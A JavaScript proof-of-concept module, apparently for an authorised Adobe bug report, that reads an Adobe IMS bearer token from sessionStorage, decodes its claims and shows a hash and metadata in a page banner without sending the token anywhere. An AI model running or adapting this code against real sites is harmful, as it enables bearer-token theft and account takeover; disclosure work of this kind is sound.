/* Authorized Adobe VIP PoC F-046. Never transmits or logs the bearer. */
(async () => {
  if (window.__F046_PUBLIC_MODULE_RAN__) return;
  window.__F046_PUBLIC_MODULE_RAN__ = true;
  let key = '';
  for (let attempt = 0; attempt < 80; attempt += 1) {
    key = Object.keys(sessionStorage).find((candidate) =>
      candidate.startsWith('adobeid_ims_access_token/milo/')) || '';
    if (key) break;
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
  let stored = null;
  try { stored = key ? JSON.parse(sessionStorage.getItem(key)) : null; } catch {}
  const token = stored?.tokenValue || stored?.token || stored?.access_token || '';
  let payload = {};
  try {
    const part = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
    payload = JSON.parse(atob(part));
  } catch {}
  const digestBytes = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(token));
  const digest = Array.from(new Uint8Array(digestBytes),
    (byte) => byte.toString(16).padStart(2, '0')).join('');
  const proof = {
    page_origin: location.origin,
    module_url: import.meta.url,
    token_present: token.length > 100,
    token_length: token.length,
    token_sha256: digest,
    client_id: payload.client_id || payload.cid || stored?.client_id || '',
    scope: payload.scope || payload.scp || stored?.scope || ''
  };
  window.__F046_PUBLIC_PROOF__ = proof;
  document.documentElement.dataset.f046PublicProof = JSON.stringify(proof);
  document.title = `F046_PUBLIC_TOKEN_READ_${proof.client_id}_${proof.token_length}`;
  const banner = document.createElement('div');
  banner.id = 'f046-public-proof';
  banner.textContent = `F046 public attacker module ${proof.module_url} executed in ${proof.page_origin}; read ${proof.client_id} bearer (${proof.token_length} bytes, SHA-256 ${proof.token_sha256.slice(0, 16)}…)`;
  Object.assign(banner.style, {
    position: 'fixed', top: '0', left: '0', right: '0', zIndex: '2147483647',
    padding: '14px', color: '#fff', background: '#8b0000',
    font: '700 14px/1.4 monospace', textAlign: 'center'
  });
  (document.body || document.documentElement).prepend(banner);
})();
export default {};
